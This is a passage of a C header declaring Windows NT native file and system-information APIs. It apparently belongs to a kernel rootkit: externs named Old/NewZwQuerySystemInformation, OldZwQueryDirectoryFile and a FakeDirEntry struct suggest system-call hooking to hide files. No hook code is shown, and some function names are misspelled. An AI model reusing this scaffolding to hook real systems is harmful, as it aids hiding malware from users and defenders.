	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG DeviceIoControlCode,
	IN PVOID InBuffer OPTIONAL,
	IN ULONG InBufferLength,
	OUT PVOID OutBuffer OPTIONAL,
	IN ULONG OutBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
NtFlushBuffersFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock
);

NTSYSAPI
NTSTATUS
NTAPI
ZwFlushBuffersFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock
);

NTSYSAPI
NTSTATUS
NTAPI
NtfsControlFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG FileSystemControlCode,
	IN PVOID InBuffer OPTIONAL,
	IN ULONG InBufferLength,
	OUT PVOID OutBuffer OPTIONAL,
	IN ULONG OutBufferLength
);
	
NTSYSAPI
NTSTATUS
NTAPI
ZwfsControlFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG FileSystemControlCode,
	IN PVOID InBuffer OPTIONAL,
	IN ULONG InBufferLength,
	OUT PVOID OutBuffer OPTIONAL,
	IN ULONG OutBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
NtLockFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PLARGE_INTEGER FileOffset,
	IN PLARGE_INTEGER Length,
	IN PULONG LockOperationKey,
	IN BOOLEAN bFailIfNotPossibleAtThisPoint,
	IN BOOLEAN bExclusiveLock
);

NTSYSAPI
NTSTATUS
NTAPI
ZwLockFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PLARGE_INTEGER FileOffset,
	IN PLARGE_INTEGER Length,
	IN PULONG LockOperationKey,
	IN BOOLEAN bFailIfNotPossibleAtThisPoint,
	IN BOOLEAN bExclusiveLock
);

NTSYSAPI
NTSTATUS
NTAPI
NtUnlockFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PLARGE_INTEGER FileOffset,
	IN PLARGE_INTEGER Length,
	IN PULONG LockOperationKey
);

NTSYSAPI
NTSTATUS
NTAPI
ZwUnlockFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PLARGE_INTEGER FileOffset,
	IN PLARGE_INTEGER Length,
	IN PULONG LockOperationKey
);

NTSYSAPI
NTSTATUS
NTAPI
NtNotifyChangeDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID ChangeBuffer,
	IN ULONG ChangeBufferLength,
	IN ULONG NotifyFilter,
	IN BOOLEAN bWatchSubtree
);
	
NTSYSAPI
NTSTATUS
NTAPI
ZwNotifyChangeDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID ChangeBuffer,
	IN ULONG ChangeBufferLength,
	IN ULONG NotifyFilter,
	IN BOOLEAN bWatchSubtree
);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenFile(
	OUT PHANDLE phFile,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG ShareMode,
	IN ULONG OpenMode
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenFile(
	OUT PHANDLE phFile,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN ULONG ShareMode,
	IN ULONG OpenMode
);


NTSYSAPI
NTSTATUS
NTAPI
NtQueryAttributesFile(
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	OUT PFILE_BASIC_INFORMATION pFileBasicInfo
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryAttributesFile(
	IN OBJECT_ATTRIBUTES ObjectAttributes,
	OUT PFILE_BASIC_INFORMATION pFileBasicInfo
);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN BOOLEAN bReturnOnlyOneEntry,
	IN PUNICODE_STRING PathMask OPTIONAL,
	IN BOOLEAN bRestartQuery
);


typedef NTSTATUS (*ZWQUERYDIRECTORYFILE)(
    HANDLE hFile,
	HANDLE hEvent,
	PIO_APC_ROUTINE IoApcRoutine,
	PVOID IoApcContext,
	PIO_STATUS_BLOCK pIoStatusBlock,
	PVOID FileInformationBuffer,
	ULONG FileInformationBufferLength,
	FILE_INFORMATION_CLASS FileInfoClass,
	BOOLEAN bReturnOnlyOneEntry,
	PUNICODE_STRING PathMask,
	BOOLEAN bRestartQuery
);
extern ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile;


NTSYSAPI
NTSTATUS
NTAPI
NtQueryEaFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID QueryEaBuffer,
	IN ULONG QueryEaBufferLength,
	IN BOOLEAN bReturnSingleEa,
	IN PVOID pListEa,
	IN ULONG pListEaLength,
	IN PULONG ListEaIndex,
	IN BOOLEAN bRestartQuery
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryEaFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID QueryEaBuffer,
	IN ULONG QueryEaBufferLength,
	IN BOOLEAN bReturnSingleEa,
	IN PVOID pListEa,
	IN ULONG pListEaLength,
	IN PULONG ListEaIndex,
	IN BOOLEAN bRestartQuery
);

NTSYSAPI
NTSTATUS
NTAPI
NtSetEaFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PVOID EaBuffer,
	IN ULONG EaBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetEaFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PVOID EaBuffer,
	IN ULONG EaBufferLength
);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass
);
	
NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass
);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PVOID FileInformationBuffer,
	IN ULONG FileInformationBufferLength,
	IN FILE_INFORMATION_CLASS FileInfoClass
);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryVolumeInformationFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID VolumeInformationBuffer,
	IN ULONG VolumeInformationBufferLength,
	IN FS_INFORMATION_CLASS FileSystemInformationClass
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryVolumeInformationFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID VolumeInformationBuffer,
	IN ULONG VolumeInformationBufferLength,
	IN FS_INFORMATION_CLASS FileSystemInformationClass
);

NTSYSAPI
NTSTATUS
NTAPI
NtSetVolumeInformationFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PVOID VolumeInformationBuffer,
	IN ULONG VolumeInformationBufferLength,
	IN FS_INFORMATION_CLASS FileSystemInformationClass
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetVolumeInformationFile(
	IN HANDLE hFile,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PVOID VolumeInformationBuffer,
	IN ULONG VolumeInformationBufferLength,
	IN FS_INFORMATION_CLASS FileSystemInformationClass
);

NTSYSAPI
NTSTATUS
NTAPI
NtReadFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID ReadBuffer,
	IN ULONG ReadBufferLength,
	IN PLARGE_INTEGER FileOffset OPTIONAL,
	IN PULONG LockOperationKey
);

NTSYSAPI
NTSTATUS
NTAPI
ZwReadFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PVOID ReadBuffer,
	IN ULONG ReadBufferLength,
	IN PLARGE_INTEGER FileOffset OPTIONAL,
	IN PULONG LockOperationKey OPTIONAL
);

//Windows 2000 only
typedef void * PVOID64;

typedef union _FILE_SEGMENT_ELEMENT {
    PVOID64 Buffer;
    ULONGLONG Alignment;
}FILE_SEGMENT_ELEMENT, *PFILE_SEGMENT_ELEMENT;

//Windows 2000 only
NTSYSAPI
NTSTATUS
NTAPI
NtReadFileScatter(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PFILE_SEGMENT_ELEMENT aSegmentArray,
	IN ULONG nBytesToRead,
	IN PLARGE_INTEGER FileOffset OPTIONAL,
	IN PULONG LockOperationKey
);

NTSYSAPI
NTSTATUS
NTAPI
ZwReadFileScatter(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PFILE_SEGMENT_ELEMENT aSegmentArray,
	IN ULONG nBytesToRead,
	IN PLARGE_INTEGER FileOffset OPTIONAL,
	IN PULONG LockOperationKey
);

NTSYSAPI
NTSTATUS
NTAPI
NtWriteFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PVOID WriteBuffer,
	IN ULONG WriteBufferLength,
	IN PLARGE_INTEGER FileOffset OPTIONAL,
	IN PULONG LockOperationKey OPTIONAL
);

NTSYSAPI
NTSTATUS
NTAPI
ZwWriteFile(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	IN PVOID WriteBuffer,
	IN ULONG WriteBufferLength,
	IN PLARGE_INTEGER FileOffset OPTIONAL,
	IN PULONG LockOperationKey OPTIONAL
);

//Windows 2000 only
NTSYSAPI
NTSTATUS
NTAPI
NtWriteFileGathter(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PFILE_SEGMENT_ELEMENT aSegmentArray,
	IN ULONG nBytesToWrite,
	IN PLARGE_INTEGER FileOffset OPTIONAL,
	IN PULONG LockOperationKey
);

NTSYSAPI
NTSTATUS
NTAPI
ZwWriteFileGathter(
	IN HANDLE hFile,
	IN HANDLE hEvent OPTIONAL,
	IN PIO_APC_ROUTINE IoApcRoutine OPTIONAL,
	IN PVOID IoApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK pIoStatusBlock,
	OUT PFILE_SEGMENT_ELEMENT aSegmentArray,
	IN ULONG nBytesToWrite,
	IN PLARGE_INTEGER FileOffset OPTIONAL,
	IN PULONG LockOperationKey
);

typedef struct _FILETIME { // ft 
    DWORD dwLowDateTime; 
    DWORD dwHighDateTime; 
} FILETIME; 

//////////////////////////////////////////////////////////////////
// added from jeremy kothe's work..
//////////////////////////////////////////////////////////////////
typedef struct _DirEntry {
  DWORD dwLenToNext;
  DWORD dwAttr;
// 08h
  FILETIME ftCreate, ftLastAccess, ftLastWrite;
// 20h
  DWORD dwUnknown[ 2 ];
  DWORD dwFileSizeLow;
  DWORD dwFileSizeHigh;
// 30h
  DWORD dwUnknown2[ 3 ];
// 3ch
  WORD wNameLen;
  WORD wUnknown;
// 40h
  DWORD dwUnknown3;
// 44h
  WORD wShortNameLen;
  WCHAR swShortName[ 12 ];
// 5eh
  WCHAR suName[ 1 ];
} DirEntry, *PDirEntry;

typedef struct _FakeDirEntry {
  FILETIME ftCreate, ftLastAccess, ftLastWrite;
  DWORD dwFileSizeLow;
  DWORD dwFileSizeHigh;
} FakeDirEntry, *PFakeDirEntry;

NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
			IN PVOID SystemInformation,
			IN ULONG SystemInformationLength,
			OUT PULONG ReturnLength);


typedef NTSTATUS (*ZWQUERYSYSTEMINFORMATION)(
            ULONG SystemInformationCLass,
			PVOID SystemInformation,
			ULONG SystemInformationLength,
			PULONG ReturnLength
);
extern ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;

NTSYSAPI
NTSTATUS
NTAPI NewZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
			IN PVOID SystemInformation,
			IN ULONG SystemInformationLength,
			OUT PULONG ReturnLength);


#endif
